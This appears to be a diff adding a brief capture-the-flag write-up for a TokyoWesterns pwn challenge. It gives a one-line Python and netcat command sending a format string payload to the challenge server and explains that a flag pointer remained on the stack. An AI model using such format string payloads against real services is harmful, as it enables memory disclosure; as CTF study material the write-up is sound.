@@ -1,0 +1,4 @@
+python -c 'print "%x"*27+"%s"' | nc  pwn1.chal.ctf.westerns.tokyo 31729
+
+
+It's just a format string vuln. Turns out a pointer to the flag was still on the stack due to how they load it.
